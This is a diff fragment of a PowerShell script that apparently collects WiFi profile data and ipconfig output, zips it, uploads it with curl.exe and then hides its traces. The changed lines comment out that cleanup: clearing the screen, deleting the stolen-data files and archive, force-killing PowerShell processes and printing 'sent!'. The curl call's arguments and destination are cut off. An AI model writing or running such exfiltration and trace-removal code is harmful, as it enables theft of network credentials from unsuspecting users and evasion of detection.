@@ -49,11 +49,11 @@ Start-Process curl.exe -ArgumentList @(
 ) -Wait *> $null
 
 # cleanup
-cls
-Remove-Item -Path "$wifiFile" -Force
-Remove-Item -Path "$e\ipcfg.txt" -Force
-Remove-Item -Path "$zip" -Force
+#cls
+#Remove-Item -Path "$wifiFile" -Force
+#Remove-Item -Path "$e\ipcfg.txt" -Force
+#Remove-Item -Path "$zip" -Force
 
 #exit quickly
-taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
-echo sent!
+#taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
+
